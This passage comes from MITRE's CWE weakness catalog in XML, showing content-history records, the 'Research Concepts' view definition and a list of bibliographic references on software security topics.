					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2019-06-20</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-06-25</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Potential_Mitigations, Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-10-28</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2022-10-13</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-01-31</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Related_Attack_Patterns</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-04-27</ns0:Modification_Date>
					<ns0:Modification_Comment>updated References, Relationships</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
         </ns0:Content_History>
      </ns0:Weakness>
      </ns0:Weaknesses>
   <ns0:Views>
      <ns0:View ID="1000" Name="Research Concepts" Type="Graph" Status="Draft">
         <ns0:Objective>This view is intended to facilitate research into weaknesses, including their inter-dependencies, and can be leveraged to systematically identify theoretical gaps within CWE. It is mainly organized according to abstractions of behaviors instead of how they can be detected, where they appear in code, or when they are introduced in the development life cycle. By design, this view is expected to include every weakness within CWE.</ns0:Objective>
         <ns0:Audience>
            <ns0:Stakeholder>
               <ns0:Type>Academic Researchers</ns0:Type>
               <ns0:Description>Academic researchers can use the high-level classes that lack a significant number of children to identify potential areas for future research.</ns0:Description>
            </ns0:Stakeholder>
            <ns0:Stakeholder>
               <ns0:Type>Vulnerability Analysts</ns0:Type>
               <ns0:Description>Those who perform vulnerability discovery/analysis use this view to identify related weaknesses that might be leveraged by following relationships between higher-level classes and bases.</ns0:Description>
            </ns0:Stakeholder>
            <ns0:Stakeholder>
               <ns0:Type>Assessment Tool Vendors</ns0:Type>
               <ns0:Description>Assessment vendors often use this view to help identify additional weaknesses that a tool may be able to detect as the relationships are more aligned with a tool's technical capabilities.</ns0:Description>
            </ns0:Stakeholder>
         </ns0:Audience>
         <ns0:Members>
            <ns0:Has_Member CWE_ID="284" View_ID="1000" />
            <ns0:Has_Member CWE_ID="435" View_ID="1000" />
            <ns0:Has_Member CWE_ID="664" View_ID="1000" />
            <ns0:Has_Member CWE_ID="682" View_ID="1000" />
            <ns0:Has_Member CWE_ID="691" View_ID="1000" />
            <ns0:Has_Member CWE_ID="693" View_ID="1000" />
            <ns0:Has_Member CWE_ID="697" View_ID="1000" />
            <ns0:Has_Member CWE_ID="703" View_ID="1000" />
            <ns0:Has_Member CWE_ID="707" View_ID="1000" />
            <ns0:Has_Member CWE_ID="710" View_ID="1000" />
         </ns0:Members>
         <ns0:Mapping_Notes>
            <ns0:Usage>Prohibited</ns0:Usage>
            <ns0:Rationale>This entry is a View. Views are not weaknesses and therefore inappropriate to describe the root causes of vulnerabilities.</ns0:Rationale>
            <ns0:Comments>Use this View or other Views to search and navigate for the appropriate weakness.</ns0:Comments>
            <ns0:Reasons>
               <ns0:Reason Type="View" />
            </ns0:Reasons>
         </ns0:Mapping_Notes>
         <ns0:Notes>
            <ns0:Note Type="Other">This view uses a deep hierarchical organization, with more levels of abstraction than other classification schemes. The top-level entries are called Pillars. Where possible, this view uses abstractions that do not consider particular languages, frameworks, technologies, life cycle development phases, frequency of occurrence, or types of resources. It explicitly identifies relationships that form chains and composites, which have not been a formal part of past classification efforts. Chains and composites might help explain why mutual exclusivity is difficult to achieve within security error taxonomies. This view is roughly aligned with MITRE's research into vulnerability theory, especially with respect to behaviors and resources. Ideally, this view will only cover weakness-to-weakness relationships, with minimal overlap and zero categories.  It is expected to include at least one parent/child relationship for every weakness within CWE.</ns0:Note>
         </ns0:Notes>
         <ns0:Content_History>
            <ns0:Submission>
                <ns0:Submission_Name>CWE Content Team</ns0:Submission_Name>
				<ns0:Submission_Organization>MITRE</ns0:Submission_Organization>
                <ns0:Submission_Date>2008-04-11</ns0:Submission_Date>
                <ns0:Submission_Version>Draft 9</ns0:Submission_Version>
                <ns0:Submission_ReleaseDate>2008-04-11</ns0:Submission_ReleaseDate>
            </ns0:Submission>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2008-09-08</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Name, Relationships, View_Audience, View_Structure</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2010-02-16</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Relationships</ns0:Modification_Comment>
            </ns0:Modification>
            <ns0:Modification>
               <ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
               <ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
               <ns0:Modification_Date>2018-03-27</ns0:Modification_Date>
               <ns0:Modification_Comment>updated Description, Other_Notes, View_Audience</ns0:Modification_Comment>
            </ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2020-02-24</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Relationships, View_Audience</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2021-03-15</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Description, Other_Notes</ns0:Modification_Comment>
				</ns0:Modification>
				<ns0:Modification>
					<ns0:Modification_Name>CWE Content Team</ns0:Modification_Name>
					<ns0:Modification_Organization>MITRE</ns0:Modification_Organization>
					<ns0:Modification_Date>2023-06-29</ns0:Modification_Date>
					<ns0:Modification_Comment>updated Mapping_Notes</ns0:Modification_Comment>
				</ns0:Modification>
            <ns0:Previous_Entry_Name Date="2008-09-09">Natural Hierarchy</ns0:Previous_Entry_Name>
         </ns0:Content_History>
      </ns0:View>
   </ns0:Views>
   <ns0:External_References>
      <ns0:External_Reference Reference_ID="REF-2">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>HttpOnly</ns0:Title>
			<ns0:URL>https://owasp.org/www-community/HttpOnly</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-3">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>Some Bad News and Some Good News</ns0:Title>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions/ms972826(v=msdn.10)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-4">
			<ns0:Author>Troy Hunt</ns0:Author>
			<ns0:Title>C is for cookie, H is for hacker - understanding HTTP only and Secure cookies</ns0:Title>
			<ns0:Publication_Year>2013</ns0:Publication_Year>
			<ns0:Publication_Month>--03</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:URL>https://www.troyhunt.com/c-is-for-cookie-h-is-for-hacker/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-5">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Mitigating Cross-site Scripting With HTTP-only Cookies</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/previous-versions//ms533046(v=vs.85)?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-6">
			<ns0:Author>Katrina Tsipenyuk</ns0:Author>
			<ns0:Author>Brian Chess</ns0:Author>
			<ns0:Author>Gary McGraw</ns0:Author>
			<ns0:Title>Seven Pernicious Kingdoms: A Taxonomy of Software Security Errors</ns0:Title>
			<ns0:Publication>NIST Workshop on Software Security Assurance Tools Techniques and Metrics</ns0:Publication>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:Publisher>NIST</ns0:Publisher>
			<ns0:URL>https://samate.nist.gov/SSATTM_Content/papers/Seven%20Pernicious%20Kingdoms%20-%20Taxonomy%20of%20Sw%20Security%20Errors%20-%20Tsipenyuk%20-%20Chess%20-%20McGraw.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-7">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Author>David LeBlanc</ns0:Author>
			<ns0:Title>Writing Secure Code</ns0:Title>
			<ns0:Edition>2nd Edition</ns0:Edition>
			<ns0:Publication_Year>2002</ns0:Publication_Year>
			<ns0:Publication_Month>--12</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:Publisher>Microsoft Press</ns0:Publisher>
			<ns0:URL>https://www.microsoftpressstore.com/store/writing-secure-code-9780735617223</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-8">
			<ns0:Author>Gregory Baatard</ns0:Author>
			<ns0:Author>Peter Hannay</ns0:Author>
			<ns0:Title>The 2011 IDN Homograph Attack Mitigation Survey</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publisher>ECU Publications</ns0:Publisher>
			<ns0:URL>http://ro.ecu.edu.au/cgi/viewcontent.cgi?article=1174&amp;context=ecuworks2012</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-11">
			<ns0:Author>Paul Kocher</ns0:Author>
			<ns0:Author>Daniel Genkin</ns0:Author>
			<ns0:Author>Daniel Gruss</ns0:Author>
			<ns0:Author>Werner Haas</ns0:Author>
			<ns0:Author>Mike Hamburg</ns0:Author>
			<ns0:Author>Moritz Lipp</ns0:Author>
			<ns0:Author>Stefan Mangard</ns0:Author>
			<ns0:Author>Thomas Prescher</ns0:Author>
			<ns0:Author>Michael Schwarz</ns0:Author>
			<ns0:Author>Yuval Yarom</ns0:Author>
			<ns0:Title>Spectre Attacks: Exploiting Speculative Execution</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://arxiv.org/abs/1801.01203</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-12">
			<ns0:Author>Moritz Lipp</ns0:Author>
			<ns0:Author>Michael Schwarz</ns0:Author>
			<ns0:Author>Daniel Gruss</ns0:Author>
			<ns0:Author>Thomas Prescher</ns0:Author>
			<ns0:Author>Werner Haas</ns0:Author>
			<ns0:Author>Stefan Mangard</ns0:Author>
			<ns0:Author>Paul Kocher</ns0:Author>
			<ns0:Author>Daniel Genkin</ns0:Author>
			<ns0:Author>Yuval Yarom</ns0:Author>
			<ns0:Author>Mike Hamburg</ns0:Author>
			<ns0:Title>Meltdown</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---03</ns0:Publication_Day>
			<ns0:URL>https://arxiv.org/abs/1801.01207</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-13">
			<ns0:Author>Xuejing Yuan</ns0:Author>
			<ns0:Author>Yuxuan Chen</ns0:Author>
			<ns0:Author>Yue Zhao</ns0:Author>
			<ns0:Author>Yunhui Long</ns0:Author>
			<ns0:Author>Xiaokang Liu</ns0:Author>
			<ns0:Author>Kai Chen</ns0:Author>
			<ns0:Author>Shengzhi Zhang</ns0:Author>
			<ns0:Author>Heqing Huang</ns0:Author>
			<ns0:Author>Xiaofeng Wang</ns0:Author>
			<ns0:Author>Carl A. Gunter</ns0:Author>
			<ns0:Title>CommanderSong: A Systematic Approach for Practical Adversarial Voice Recognition</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://arxiv.org/pdf/1801.08535.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-14">
			<ns0:Author>Nicholas Carlini</ns0:Author>
			<ns0:Author>David Wagner</ns0:Author>
			<ns0:Title>Audio Adversarial Examples: Targeted Attacks on Speech-to-Text</ns0:Title>
			<ns0:Publication_Year>2018</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---05</ns0:Publication_Day>
			<ns0:URL>https://arxiv.org/abs/1801.01944</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-15">
			<ns0:Author>James Vincent</ns0:Author>
			<ns0:Title>Magic AI: These are the Optical Illusions that Trick, Fool, and Flummox Computers</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--04</ns0:Publication_Month>
			<ns0:Publication_Day>---12</ns0:Publication_Day>
			<ns0:Publisher>The Verge</ns0:Publisher>
			<ns0:URL>https://www.theverge.com/2017/4/12/15271874/ai-adversarial-images-fooling-attacks-artificial-intelligence</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-16">
			<ns0:Author>Christian Szegedy</ns0:Author>
			<ns0:Author>Wojciech Zaremba</ns0:Author>
			<ns0:Author>Ilya Sutskever</ns0:Author>
			<ns0:Author>Joan Bruna</ns0:Author>
			<ns0:Author>Dumitru Erhan</ns0:Author>
			<ns0:Author>Ian Goodfellow</ns0:Author>
			<ns0:Author>Rob Fergus</ns0:Author>
			<ns0:Title>Intriguing properties of neural networks</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---19</ns0:Publication_Day>
			<ns0:URL>https://arxiv.org/abs/1312.6199</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-17">
			<ns0:Author>OpenAI</ns0:Author>
			<ns0:Title>Attacking Machine Learning with Adversarial Examples</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---24</ns0:Publication_Day>
			<ns0:URL>https://openai.com/research/attacking-machine-learning-with-adversarial-examples</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-18">
			<ns0:Author>Secure Software, Inc.</ns0:Author>
			<ns0:Title>The CLASP Application Security Process</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:URL>https://cwe.mitre.org/documents/sources/TheCLASPApplicationSecurityProcess.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-21">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>CSV Injection</ns0:Title>
			<ns0:Publication_Year>2020</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---02</ns0:Publication_Day>
			<ns0:URL>https://owasp.org/www-community/attacks/CSV_Injection</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-22">
			<ns0:Author>Jamie Rougvie</ns0:Author>
			<ns0:Title>Data Extraction to Command Execution CSV Injection</ns0:Title>
			<ns0:Publication_Year>2019</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---06</ns0:Publication_Day>
			<ns0:URL>https://www.veracode.com/blog/secure-development/data-extraction-command-execution-csv-injection</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-23">
			<ns0:Author>George Mauer</ns0:Author>
			<ns0:Title>The Absurdly Underestimated Dangers of CSV Injection</ns0:Title>
			<ns0:Publication_Year>2017</ns0:Publication_Year>
			<ns0:Publication_Month>--10</ns0:Publication_Month>
			<ns0:Publication_Day>---07</ns0:Publication_Day>
			<ns0:URL>http://georgemauer.net/2017/10/07/csv-injection.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-24">
			<ns0:Author>James Kettle</ns0:Author>
			<ns0:Title>Comma Separated Vulnerabilities</ns0:Title>
			<ns0:Publication_Year>2014</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---29</ns0:Publication_Day>
			<ns0:URL>https://rstforums.com/forum/topic/82690-comma-separated-vulnerabilities/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-35">
			<ns0:Author>Andrew Horton</ns0:Author>
			<ns0:Title>Clickjacking For Shells</ns0:Title>
			<ns0:URL>https://www.exploit-db.com/docs/17881.pdf</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-36">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>Clickjacking - OWASP</ns0:Title>
			<ns0:URL>https://owasp.org/www-community/attacks/Clickjacking</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-37">
			<ns0:Author>Internet Security</ns0:Author>
			<ns0:Title>SecTheory</ns0:Title>
			<ns0:URL>https://www.sectheory.com/clickjacking.htm</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-38">
			<ns0:Author>W3C</ns0:Author>
			<ns0:Title>Content Security Policy Level 3</ns0:Title>
			<ns0:URL>https://w3c.github.io/webappsec-csp/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-39">
			<ns0:Author>Alex Yumashev</ns0:Author>
			<ns0:Title>Target="_blank" - the most underestimated vulnerability ever</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---04</ns0:Publication_Day>
			<ns0:URL>https://medium.com/@jitbit/target-blank-the-most-underestimated-vulnerability-ever-96e328301f4c</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-40">
			<ns0:Author>Ben Halpern</ns0:Author>
			<ns0:Title>The target="_blank" vulnerability by example</ns0:Title>
			<ns0:Publication_Year>2016</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://dev.to/ben/the-targetblank-vulnerability-by-example</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-41">
			<ns0:Author>Fortify Software</ns0:Author>
			<ns0:Title>Fortify Descriptions</ns0:Title>
			<ns0:URL>http://vulncat.fortifysoftware.com</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-42">
			<ns0:Author>Beth Stearns</ns0:Author>
			<ns0:Title>The Java(TM) Tutorial: The Java Native Interface</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publisher>Sun Microsystems</ns0:Publisher>
			<ns0:URL>http://www.eg.bucknell.edu/~mead/Java-tutorial/native1.1/index.html</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-43">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>OWASP TOP 10</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--05</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://github.com/owasp-top/owasp-top-2007</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-44">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Author>David LeBlanc</ns0:Author>
			<ns0:Author>John Viega</ns0:Author>
			<ns0:Title>24 Deadly Sins of Software Security</ns0:Title>
			<ns0:Publication>McGraw-Hill</ns0:Publication>
			<ns0:Publication_Year>2010</ns0:Publication_Year>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-45">
			<ns0:Author>OWASP</ns0:Author>
			<ns0:Title>OWASP Enterprise Security API (ESAPI) Project</ns0:Title>
			<ns0:URL>http://www.owasp.org/index.php/ESAPI</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-46">
			<ns0:Author>Joshbw</ns0:Author>
			<ns0:Title>Output Sanitization</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---18</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20081208054333/http://analyticalengine.net/archives/58</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-47">
			<ns0:Author>Niyaz PK</ns0:Author>
			<ns0:Title>Sanitizing user data: How and where to do it</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--09</ns0:Publication_Month>
			<ns0:Publication_Day>---11</ns0:Publication_Day>
			<ns0:URL>https://web.archive.org/web/20090105222005/http://www.diovo.com/2008/09/sanitizing-user-data-how-and-where-to-do-it/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-48">
			<ns0:Author>Jeremiah Grossman</ns0:Author>
			<ns0:Title>Input validation or output filtering, which is better?</ns0:Title>
			<ns0:Publication_Year>2007</ns0:Publication_Year>
			<ns0:Publication_Month>--01</ns0:Publication_Month>
			<ns0:Publication_Day>---30</ns0:Publication_Day>
			<ns0:URL>https://blog.jeremiahgrossman.com/2007/01/input-validation-or-output-filtering.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-49">
			<ns0:Author>Jim Manico</ns0:Author>
			<ns0:Title>Input Validation - Not That Important</ns0:Title>
			<ns0:Publication_Year>2008</ns0:Publication_Year>
			<ns0:Publication_Month>--08</ns0:Publication_Month>
			<ns0:Publication_Day>---10</ns0:Publication_Day>
			<ns0:URL>https://manicode.blogspot.com/2008/08/input-validation-not-that-important.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-50">
			<ns0:Author>Michael Eddington</ns0:Author>
			<ns0:Title>Preventing XSS with Correct Output Encoding</ns0:Title>
			<ns0:URL>http://phed.org/2008/05/19/preventing-xss-with-correct-output-encoding/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-52">
			<ns0:Author>Greg Hoglund</ns0:Author>
			<ns0:Author>Gary McGraw</ns0:Author>
			<ns0:Title>Exploiting Software: How to Break Code</ns0:Title>
			<ns0:Publication_Year>2004</ns0:Publication_Year>
			<ns0:Publication_Month>--02</ns0:Publication_Month>
			<ns0:Publication_Day>---27</ns0:Publication_Day>
			<ns0:Publisher>Addison-Wesley</ns0:Publisher>
			<ns0:URL>http://www.exploitingsoftware.com/</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-53">
			<ns0:Author>Alec Muffet</ns0:Author>
			<ns0:Title>The night the log was forged</ns0:Title>
			<ns0:URL>http://doc.novsu.ac.ru/oreilly/tcpip/puis/ch10_05.htm</ns0:URL>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-56">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Using the Strsafe.h Functions</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/windows/win32/menurc/strsafe-ovw?redirectedfrom=MSDN</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-57">
			<ns0:Author>Matt Messier</ns0:Author>
			<ns0:Author>John Viega</ns0:Author>
			<ns0:Title>Safe C String Library v1.0.3</ns0:Title>
			<ns0:URL>http://www.gnu-darwin.org/www001/ports-1.5a-CURRENT/devel/safestr/work/safestr-1.0.3/doc/safestr.html</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-58">
			<ns0:Author>Michael Howard</ns0:Author>
			<ns0:Title>Address Space Layout Randomization in Windows Vista</ns0:Title>
			<ns0:URL>https://learn.microsoft.com/en-us/archive/blogs/michael_howard/address-space-layout-randomization-in-windows-vista</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-59">
			<ns0:Author>Arjan van de Ven</ns0:Author>
			<ns0:Title>Limiting buffer overflows with ExecShield</ns0:Title>
			<ns0:URL>https://archive.is/saAFo</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-60">
			<ns0:Title>PaX</ns0:Title>
			<ns0:URL>https://en.wikipedia.org/wiki/Executable_space_protection#PaX</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-61">
			<ns0:Author>Microsoft</ns0:Author>
			<ns0:Title>Understanding DEP as a mitigation technology part 1</ns0:Title>
			<ns0:URL>https://msrc.microsoft.com/blog/2009/06/understanding-dep-as-a-mitigation-technology-part-1/</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-62">
			<ns0:Author>Mark Dowd</ns0:Author>
			<ns0:Author>John McDonald</ns0:Author>
			<ns0:Author>Justin Schuh</ns0:Author>
			<ns0:Title>The Art of Software Security Assessment</ns0:Title>
			<ns0:Edition>1st Edition</ns0:Edition>
			<ns0:Publication_Year>2006</ns0:Publication_Year>
			<ns0:Publisher>Addison Wesley</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-64">
			<ns0:Author>Grant Murphy</ns0:Author>
			<ns0:Title>Position Independent Executables (PIE)</ns0:Title>
			<ns0:Publication_Year>2012</ns0:Publication_Year>
			<ns0:Publication_Month>--11</ns0:Publication_Month>
			<ns0:Publication_Day>---28</ns0:Publication_Day>
			<ns0:Publisher>Red Hat</ns0:Publisher>
			<ns0:URL>https://www.redhat.com/en/blog/position-independent-executables-pie</ns0:URL>
			<ns0:URL_Date>2023-04-07</ns0:URL_Date>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-65">
			<ns0:Author>M. Howard</ns0:Author>
			<ns0:Author>D. LeBlanc</ns0:Author>
			<ns0:Author>J. Viega</ns0:Author>
			<ns0:Title>19 Deadly Sins of Software Security</ns0:Title>
			<ns0:Publication_Year>2005</ns0:Publication_Year>
			<ns0:Publication_Month>--07</ns0:Publication_Month>
			<ns0:Publication_Day>---26</ns0:Publication_Day>
			<ns0:Publisher>McGraw-Hill/Osborne</ns0:Publisher>
		</ns0:External_Reference>
      <ns0:External_Reference Reference_ID="REF-66">
			<ns0:Author>OWASP, Fortify Software</ns0:Author>
			<ns0:Title>ASP.NET Misconfiguration: Missing Custom Error Handling</ns0:Title>
